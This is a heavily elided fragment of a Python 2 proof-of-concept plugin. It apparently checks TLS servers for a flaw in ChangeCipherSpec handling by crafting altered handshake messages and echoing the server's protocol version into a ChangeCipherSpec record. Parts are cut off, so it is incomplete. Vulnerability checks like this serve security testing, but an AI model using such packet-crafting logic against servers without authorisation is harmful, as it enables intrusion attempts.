...
class MyPoc(BaseFrame):
    ...
    @staticmethod
    def modifyStr(str1, index, value):
    ...
    def verify(cls, args):
        ...
        if options['msg_type'] == 1:
            handshake_message = cls.modifyStr(cls.handshake_message, 10, '\x02')
        elif options['msg_type'] == 2:
            handshake_message = cls.modifyStr(cls.handshake_message, 10, '\x03')
        elif options['msg_type'] == 3:
            handshake_message = cls.modifyStr(cls.handshake_message, 2, '\x00')
            handshake_message = cls.modifyStr(handshake_message, 10, '\x00')
        ...
        for i in xrange(28):
            handshake_message = cls.modifyStr(handshake_message,
                                              15 + i,
        ...
        if options['verbose']:
            print cls.hexdump(handshake_message)
            ...
            if ccs_sent:
                ...
                for i in xrange(len(buf)):
                    if ( buf[i] == '\x16' and  # handshake
                         ...
                         buf[i + 9] == '\x03'):
                        ccs_message = cls.modifyStr(cls.ccs_message, 2, buf[i + 10])  # Use the protocol version sent by the server.
